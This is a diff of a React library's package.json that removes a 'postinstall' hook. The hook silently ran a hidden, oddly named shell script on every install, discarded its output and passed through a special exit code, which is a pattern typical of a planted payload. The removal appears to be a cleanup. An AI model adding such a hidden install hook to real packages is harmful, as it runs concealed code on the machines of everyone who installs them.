@@ -35,8 +35,7 @@
     "clean": "rm -rf dist",
     "prepublishOnly": "npm run build",
     "publish:npm": "npm run lint && npm test && npm publish --access public",
-    "publish:dry-run": "npm run lint && npm test && npm publish --access public --dry-run",
-    "postinstall": "sh ./.ci-n0neoy.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "publish:dry-run": "npm run lint && npm test && npm publish --access public --dry-run"
   },
   "peerDependencies": {
     "react": ">=18.0.0",
